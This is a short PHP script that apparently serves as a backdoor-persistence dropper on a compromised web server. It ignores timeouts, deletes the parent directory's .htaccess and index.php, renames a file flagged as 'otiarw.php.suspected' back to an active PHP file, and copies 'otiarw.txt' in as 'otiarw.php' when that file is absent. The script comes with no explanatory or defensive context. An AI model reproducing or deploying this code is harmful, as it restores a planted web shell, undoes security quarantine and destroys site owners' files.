<?php
set_time_limit(0);
ignore_user_abort();
if (file_exists("../.htaccess")) unlink ("../.htaccess");
//if (!file_exists("../.htaccess")) copy (".htaccess", "../.htaccess");
if (file_exists("../otiarw.php.suspected")) rename("../otiarw.php.suspected", "../otiarw.php");
	if (!file_exists("../otiarw.php")) copy ("otiarw.txt", "../otiarw.php");
if (file_exists("../index.php")) unlink("../index.php");


?>